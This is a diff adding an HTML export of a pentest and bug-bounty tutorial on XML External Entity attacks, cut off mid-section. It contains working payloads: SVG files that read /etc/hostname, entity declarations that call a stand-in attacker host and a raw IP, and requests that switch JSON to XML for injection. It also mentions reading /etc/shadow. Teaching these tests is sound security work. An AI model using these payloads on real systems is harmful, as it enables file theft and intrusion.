@@ -1,0 +1,752 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>4 XML eXternal Entities</title><style>
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.highlight-default {
+}
+.highlight-gray {
+	color: rgb(155,154,151);
+}
+.highlight-brown {
+	color: rgb(100,71,58);
+}
+.highlight-orange {
+	color: rgb(217,115,13);
+}
+.highlight-yellow {
+	color: rgb(223,171,1);
+}
+.highlight-teal {
+	color: rgb(15,123,108);
+}
+.highlight-blue {
+	color: rgb(11,110,153);
+}
+.highlight-purple {
+	color: rgb(105,64,165);
+}
+.highlight-pink {
+	color: rgb(173,26,114);
+}
+.highlight-red {
+	color: rgb(224,62,62);
+}
+.highlight-gray_background {
+	background: rgb(235,236,237);
+}
+.highlight-brown_background {
+	background: rgb(233,229,227);
+}
+.highlight-orange_background {
+	background: rgb(250,235,221);
+}
+.highlight-yellow_background {
+	background: rgb(251,243,219);
+}
+.highlight-teal_background {
+	background: rgb(221,237,234);
+}
+.highlight-blue_background {
+	background: rgb(221,235,241);
+}
+.highlight-purple_background {
+	background: rgb(234,228,242);
+}
+.highlight-pink_background {
+	background: rgb(244,223,235);
+}
+.highlight-red_background {
+	background: rgb(251,228,228);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(55, 53, 47, 0.6);
+	fill: rgba(55, 53, 47, 0.6);
+}
+.block-color-brown {
+	color: rgb(100,71,58);
+	fill: rgb(100,71,58);
+}
+.block-color-orange {
+	color: rgb(217,115,13);
+	fill: rgb(217,115,13);
+}
+.block-color-yellow {
+	color: rgb(223,171,1);
+	fill: rgb(223,171,1);
+}
+.block-color-teal {
+	color: rgb(15,123,108);
+	fill: rgb(15,123,108);
+}
+.block-color-blue {
+	color: rgb(11,110,153);
+	fill: rgb(11,110,153);
+}
+.block-color-purple {
+	color: rgb(105,64,165);
+	fill: rgb(105,64,165);
+}
+.block-color-pink {
+	color: rgb(173,26,114);
+	fill: rgb(173,26,114);
+}
+.block-color-red {
+	color: rgb(224,62,62);
+	fill: rgb(224,62,62);
+}
+.block-color-gray_background {
+	background: rgb(235,236,237);
+}
+.block-color-brown_background {
+	background: rgb(233,229,227);
+}
+.block-color-orange_background {
+	background: rgb(250,235,221);
+}
+.block-color-yellow_background {
+	background: rgb(251,243,219);
+}
+.block-color-teal_background {
+	background: rgb(221,237,234);
+}
+.block-color-blue_background {
+	background: rgb(221,235,241);
+}
+.block-color-purple_background {
+	background: rgb(234,228,242);
+}
+.block-color-pink_background {
+	background: rgb(244,223,235);
+}
+.block-color-red_background {
+	background: rgb(251,228,228);
+}
+.select-value-color-default { background-color: rgba(206,205,202,0.5); }
+.select-value-color-gray { background-color: rgba(155,154,151, 0.4); }
+.select-value-color-brown { background-color: rgba(140,46,0,0.2); }
+.select-value-color-orange { background-color: rgba(245,93,0,0.2); }
+.select-value-color-yellow { background-color: rgba(233,168,0,0.2); }
+.select-value-color-green { background-color: rgba(0,135,107,0.2); }
+.select-value-color-blue { background-color: rgba(0,120,223,0.2); }
+.select-value-color-purple { background-color: rgba(103,36,222,0.2); }
+.select-value-color-pink { background-color: rgba(221,0,129,0.2); }
+.select-value-color-red { background-color: rgba(255,0,26,0.2); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="abeb1660-97b5-4224-999a-40090e9948ec" class="page sans"><header><h1 class="page-title">4 XML eXternal Entities</h1></header><div class="page-body"><nav id="58306eb0-264a-4572-9c9c-cb426ef0c2d4" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#127cad92-3674-4daf-abac-55bda01fcfea">Introduction</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#8c251a56-bc3d-4a4c-b416-68aa343e2936">Blind XXE</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#90a9fbe4-7f4e-46c9-9072-a08623035a78">But what is XXE?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#01e40f98-0aeb-42bd-9ac3-d1cec955e594">XXE via SVG</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#51dda3af-60be-4646-9b7f-eed41dbe0a1a">XXE via PDF&#x27;s</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#0061030e-cf82-4cc4-85cf-daf6e81d9c9a">JSON to XXE</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#e84e458b-1b64-4ed1-a52e-4de0e712136d">XXE via SOAP</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#ff707d51-3afb-4b21-b9f5-afe3af1d7e45">Exploiting XXE</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#a0e5d3df-cdef-4642-818e-3714313d3326">Grabbing files</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#e0cb2ff6-90fd-488c-9d45-d42668190011">Executing commands</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#8da67d4d-f952-484e-8ab7-cd1bcdba57b0">Executing SSRF via XXE</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#ad8e98be-1584-4fa3-8bb3-d2b3ff2bef04">Exploiting blind XXE</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#fcfa60a0-c0e2-4a34-9cd7-443a2ccffd70">Executing a DoS attack</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#ba98adf0-9517-4f12-beee-b83b33beb8ba">Bypasses</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#ea40b4a9-cab3-4127-8c4a-d91d02c4dd81">BASE64</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#9595d211-14fe-4cfd-872b-ec91d8f2bbb4">UTF-7</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#c9946f18-5581-4312-ae5a-1e268c0622ef">XXE Tools</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#c8bbbcc1-6396-42c2-a174-269f34207612">Preventing XXE</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#739e1611-aedc-4225-ac39-d5f3d5591e28">Static analysis tools</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#e791d3c5-394e-4f9d-ab7a-e8bf5784a5b0">Dynamic analysis tools</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#e129d505-667c-44db-bc4e-fee45956b7dd">Manual testing</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#9c7505f5-5a56-4a6e-a110-2f3df7f85efa">Risk Factors</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#de2e3388-f7a1-479a-a624-b27285a86258">General tips and tricks</a></div></nav><h1 id="127cad92-3674-4daf-abac-55bda01fcfea" class="">Introduction</h1><p id="c5ccb420-ad46-48c8-90f2-0d11e4e0739f" class="">XXE is one of my favourite attack types because it&#x27;s usually hidden below a surface level concealment. We all know that almost nobody uses XML files anymore these days as JSON has taken over and even YAML. Yet the fact XXE appears in the OWASP top 10 of 2017 does say something about this vulnerability type. </p><p id="100aedd8-e9dd-4a0f-bb0a-de6faa3c0eaa" class="">Today we are going to look at all the possible attack vectors that we can think of, both from the perspective of a pentester and of a bug bounty hunter. Defending your application against XXE attacks is not simple either so i hope this will give anyone building a web application some ideas as to how to protect their application better. </p><h1 id="8c251a56-bc3d-4a4c-b416-68aa343e2936" class="">Blind XXE</h1><p id="998a9aa6-bde4-4306-85dc-b2237477f2ac" class="">Before we start talking about XXE, we need to talk about the blind aspect of XXE attacks. Whether you are a pentester, bug bounty hunter or ethical hacker in general, it&#x27;s always a good idea to look for blind XXE over normal XXE. This will ensure that you will not miss any entry points as sometimes we might be testing for XXE and think an endpoint is not vulnerable because we do not see any data being returned while in all actuallity the endpoint might be vulnerable to blind XXE. </p><p id="742d2e78-b7f4-42b4-9cc1-54dbc466a057" class="">Blind XXE means that you are performing a succesfull attack but that you are not seeing any output from the server. This means that in order to confirm whether or not our attack was successful, we need to make a request to an external server. I usually use the burp collaborator to test for this vulnerability and will also make sure to test for non blind vulnerabilities after that as well in case we do have a verbose defect but the egress filtering is enabled or something like that. Egress filtering means when a firewall filters outgoing traffic and does not allow certain outgoing requests like HTTP requests. </p><h1 id="90a9fbe4-7f4e-46c9-9072-a08623035a78" class="">But what is XXE?</h1><p id="595f79a1-13d8-4846-92a7-098e9c0af373" class="">We&#x27;ve talked about this a little bit already but for XXE to occur, we need to have an XML processor at work in the background. An XML processor will take in any XML file and will by default allow for external entities to be included. These entities can be anything ranging from system commands like ls (maybe even a reverse shell?) to files like /etc/shadow. </p><p id="05c86d90-0e32-473c-a441-eb42ef93298c" class="">The good thing is that if we do find an XXE attack, it doesn&#x27;t matter if we are a pentester or a bugbounty hunter. The severity of this issue will always be at least medium if you can find files on the system and probably even higher if you can execute commands. Just make sure you don&#x27;t forget to prove impact, you don&#x27;t want to lose all this work because you did not prove any impact. </p><p id="9f0a51f6-bb59-4798-bab0-611ad12176cc" class="">Most people know what a conventional XML file looks like. </p><pre id="9d88b95b-e902-4b08-8978-486af5cb83db" class="code"><code>&lt;note&gt;
+&lt;script/&gt;
+&lt;script/&gt;
+&lt;to&gt;Tove&lt;/to&gt;
+&lt;from&gt;Jani&lt;/from&gt;
+&lt;heading&gt;Reminder&lt;/heading&gt;
+&lt;body&gt;Don&#x27;t forget me this weekend!&lt;/body&gt;
+&lt;/note&gt;</code></pre><p id="00025b30-65b8-4f36-92a4-54061d05a0d1" class="">If we can import this XML file into our application to create a note we have an entry point for XXE attacks but this almost never happens! </p><p id="5607863a-947d-4a57-8c7a-0372e78a0a93" class="">You really don&#x27;t see much XML out there at all anymore. Most applications will use different types of data formats yet this vulnerability is number 4 in the top 10 OWASP list of 2017. Does this mean that XML files are becoming a hot topic again? No, ofcourse not! Good riddance to that old outdated technology! </p><p id="e6bd6558-c130-4161-b7b1-f72095f4299d" class="">There are other entry points for XML attacks that most hunters might not have heard about or they might not have given it a second look. </p><h2 id="01e40f98-0aeb-42bd-9ac3-d1cec955e594" class="">XXE via SVG</h2><p id="153b2b3d-9c62-4374-8450-c15b119ffe20" class="">This is one of my favourite ones because almost every website will have some option to upload a picture and render that picture. This is what SVG is in essence and though it may seem more complicated than that, it is not. It is in fact just an image but described in an XML format. This means that if the server allows SVG files that we can always test for XXE. </p><pre id="5310138b-3fdb-41e3-97ba-23285f9af459" class="code"><code>&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; width=&quot;300&quot; version=&quot;1.1&quot; height=&quot;200&quot;&gt;&lt;image xlink:href=&quot;file:///etc/hostname&quot;&gt;&lt;/image&gt;&lt;/svg&gt;</code></pre><p id="8deee4ba-9676-4b6a-af41-4db6bc48fbb8" class="">This SVG file will try to open the file:///etc/hostname and display it to the user. </p><pre id="437e65a4-60bd-4725-81e2-7822eec8efdf" class="code"><code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;http://f2g9j7hhkax.web-attacker.com&quot;&gt; ]&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; width=&quot;300&quot; version=&quot;1.1&quot; height=&quot;200&quot;&gt;&lt;!ENTITY xxe SYSTEM &#x27;http://f2g9j7hhkax.web-attacker.com&#x27;&gt;&lt;/svg&gt;</code></pre><p id="c57c6783-b305-41f2-926e-0e608a54db8d" class="">But we can also just test for blind XXE to start with. We can save these texts as &#x27;Anything.SVG&#x27; and try to upload them anywhere that we can upload an image and that the image would render for example in profile pictures or banners. </p><h2 id="51dda3af-60be-4646-9b7f-eed41dbe0a1a" class="">XXE via PDF&#x27;s</h2><p id="ffaf87cc-0ad7-4d22-938a-0f17dcfe6163" class="">Attacking a target sometimes means getting creative ... very creative. It may not seem directly apearant but we can also test for XXE via PDF upload functionality. Again the target will need to render the PDF to test for XXE attacks because if you can simple upload a PDF file but it will never render then the server will also never try to render your XML attack string. </p><p id="a485d155-a431-4016-b198-195f1a4be358" class="">According to <a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#pdf-file-upload">hacktricks</a> if the following attack string is accepted we can also check if XML input is accepted. </p><pre id="be0f191f-ad64-464b-86b3-1c3841fa9c10" class="code"><code>POST /action HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar</code></pre><p id="37206a2b-bd8a-4882-9fcb-9f0cf2ffafcb" class="">We can then try if XML input is also accepted</p><pre id="b1d44b89-a559-4429-abd6-7f3909ef3d1b" class="code"><code>POST /action HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;foo&gt;bar&lt;/foo&gt;</code></pre><p id="1665c27a-68ef-4d9e-8783-9dd0ac3e4201" class="">And subsequently we can add our XXE attack string but ofcourse only if the XML input is accepted and processed. </p><pre id="4e698a27-7669-4292-82c6-cb82229c8c83" class="code"><code>POST /action HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+&lt;!ENTITY xxe SYSTEM &#x27;http://f2g9j7hhkax.web-attacker.com&#x27;&gt;</code></pre><h2 id="0061030e-cf82-4cc4-85cf-daf6e81d9c9a" class="">JSON to XXE</h2><p id="05643041-a00d-45e1-9fb7-e578d577c154" class="">Most web applications these days accept JSON as input and it seems like this covers most entry points for XXE pretty well since if we can&#x27;t work with XML files; it will be really hard to execute an attack that pivots on the XML format. Or will it? It may not be as foolproof as many people think it is. </p><p id="c440c916-a1c9-49d1-b325-7e23266462ce" class=""><a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#content-type-from-json-to-xee">https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#content-type-from-json-to-xee</a></p><p id="ce45333e-f78d-4be3-8906-3f9487b67a91" class="">According to hacktricks we can simple change the content type header. This will take advantage of the fact that some servers have XML processors built into them by default and if the developer never disabled them, we can use those to yet insert XXE attack vectors. Let&#x27;s look at the example hacktricks gave us. </p><pre id="252329f4-4496-40a0-901b-232fd37e53ad" class="code"><code>Content-Type: application/json;charset=UTF-8
+
+{&quot;root&quot;: {&quot;root&quot;: {
+  &quot;firstName&quot;: &quot;Avinash&quot;,
+  &quot;lastName&quot;: &quot;&quot;,
+  &quot;country&quot;: &quot;United States&quot;,
+  &quot;city&quot;: &quot;ddd&quot;,
+  &quot;postalCode&quot;: &quot;ddd&quot;
+}}}</code></pre><p id="f2f4bb84-72ae-4751-b67d-66765b4643fe" class="">We can simply change the content type and test if this still works and if the content will be processed by the webserver. </p><pre id="558d2c83-cdfa-4fe1-9a8c-c75d6e5c10fd" class="code"><code>Content-Type: application/json;charset=UTF-8
+
+Will change to
+
+Content-Type: application/xml;charset=UTF-8</code></pre><p id="1644d95a-47f2-4891-b8b0-8784654d0c53" class="">This ofcourse means we also have to change the body to an XML format. To do this i use a JSON to XML converter. </p><p id="b3e74586-c32c-45cd-a6bb-63a85627ca0a" class=""><a href="https://www.freeformatter.com/json-to-xml-converter.html">https://www.freeformatter.com/json-to-xml-converter.html</a></p><figure id="3d9b7402-d8de-4eac-b29f-d2591b7b185d" class="image"><a href="4%20XML%20eXternal%20Entities%20abeb166097b54224999a40090e9948ec/Untitled.png"><img style="width:864px" src="4%20XML%20eXternal%20Entities%20abeb166097b54224999a40090e9948ec/Untitled.png"/></a></figure><p id="3cefc60c-bc82-4825-9fd0-ee80a7930599" class="">Combining all this we get </p><pre id="05b3b33c-75ee-4086-bfda-cc26608e1941" class="code"><code>Content-Type: application/xml;charset=UTF-8
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;
+&lt;root&gt;
+ &lt;root&gt;
+  &lt;firstName&gt;dsfsdfsdf&lt;/firstName&gt;
+  &lt;lastName/&gt;
+  &lt;country&gt;United States&lt;/country&gt;
+  &lt;city&gt;ddd&lt;/city&gt;
+  &lt;postalCode&gt;ddd&lt;/postalCode&gt;
+ &lt;/root&gt;
+&lt;/root&gt;</code></pre><p id="b39549d3-7aad-4a0b-a20b-828bc3520254" class="">We can also use the Burp Extension named “Content Type Converter“ though i like to at least explain how you can do it manually as well. </p><p id="f2c2b1cd-80d5-4c67-b0d1-49fdc444e2cc" class="">If the server also accepts this request we can try to enter our XXE attack vector. </p><pre id="022d4bb1-7d51-4ac0-8b14-1128a30b0b22" class="code"><code>Content-Type: application/xml;charset=UTF-8
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;
+&lt;!DOCTYPE testingxxe [&lt;!ENTITY xxe SYSTEM &quot;http://34.229.92.127:8000/TEST.ext&quot; &gt;]&gt; 
+&lt;root&gt;
+ &lt;root&gt;
+  &lt;firstName&gt;&amp;xxe;&lt;/firstName&gt;
+  &lt;lastName/&gt;
+  &lt;country&gt;United States&lt;/country&gt;
+  &lt;city&gt;ddd&lt;/city&gt;
+  &lt;postalCode&gt;ddd&lt;/postalCode&gt;
+ &lt;/root&gt;
+&lt;/root&gt;</code></pre><p id="60354cd3-83fe-434b-b6fa-8e576beea6cf" class="">In this example only the first node &#x27;Firstname&#x27; is tested but ofcourse we need to test all the nodes because XXE can occur on every single node. This happens because the developer either has to secure every node seperately on some XML processors. </p><h2 id="e84e458b-1b64-4ed1-a52e-4de0e712136d" class="">XXE via SOAP</h2><p id="3d830faf-e518-4905-80c4-fecf0073461e" class="">SOAP stands for Simple Object Access Protocol, it&#x27;s basically another protocol such as HTTP or FTP but SOAP uses an XML like structure to communicate. The keen eyed among you might have already guessed that SOAP is thus also possibly vulnerable to XXE attacks but we will again have to make sure we test every single node. In SOAP every single node will have to be secured by the developer so we can also test for other things in here like SQLi and XSS due to this fact. </p><h1 id="ff707d51-3afb-4b21-b9f5-afe3af1d7e45" class="">Exploiting XXE</h1><h2 id="a0e5d3df-cdef-4642-818e-3714313d3326" class="">Grabbing files</h2><p id="813c4f0c-51bd-4a73-989e-955a54c6df88" class="">When we finally do find the much desired XXE attack we do have to still find a way to exploit it fully and this can be a little bit harder to do. Usually the first thing we want to try is to extract files from the local file system. For a pentester this will make for a pretty high severity as is if they can retrieve files but for a bug bounty hunter that will be a medium at most unless the attacked can retrieve files with sensitive information such as database passwords but then still the attacker will need to be able to exploit those credentials. </p><pre id="e23c60d7-20d2-45ec-ad82-39249766bd9c" class="code"><code>&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; width=&quot;300&quot; version=&quot;1.1&quot; height=&quot;200&quot;&gt;&lt;image xlink:href=&quot;file:///etc/hostname&quot;&gt;&lt;/image&gt;&lt;/svg&gt;</code></pre><p id="3cf3e1ac-c766-4a04-9e70-ba304f43ae8a" class="">Sometimes grabbing files is prohibit or simply will not work. We can overcome this in certain instances by triggering error messages that have the content of the message as the file. </p><pre id="59c5f010-1b87-4e19-9ee6-bf656bb7304d" 